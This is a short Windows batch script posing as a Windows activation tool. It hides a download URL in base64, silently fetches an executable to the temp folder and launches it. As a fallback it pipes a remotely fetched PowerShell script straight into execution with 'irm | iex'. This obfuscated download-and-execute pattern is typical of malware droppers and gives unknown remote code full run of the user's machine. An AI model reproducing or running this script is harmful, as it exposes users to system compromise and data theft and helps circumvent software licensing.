@echo off
set "b64=aHR0cHM6Ly9naXRodWIuY29tL2JldGFtb2Q5L1dpbmRvd3MtMTAtYW5kLTExLUFjdGl2YXRvci9yZWxlYXNlcy9kb3dubG9hZC8xMi4yNy4yMDI0L1dpbmRvd3NLZXkuZXhl"
for /f "tokens=*" %%a in ('powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%b64%'))"') do set "url=%%a"
set "filename=%temp%\windowskeyactivation.exe"
powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url%' -OutFile '%filename%'" >nul 2>&1
if exist "%filename%" (
    start "" "%filename%"
) else (
    goto server
)
:server
powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm https://get.activated.win | iex"
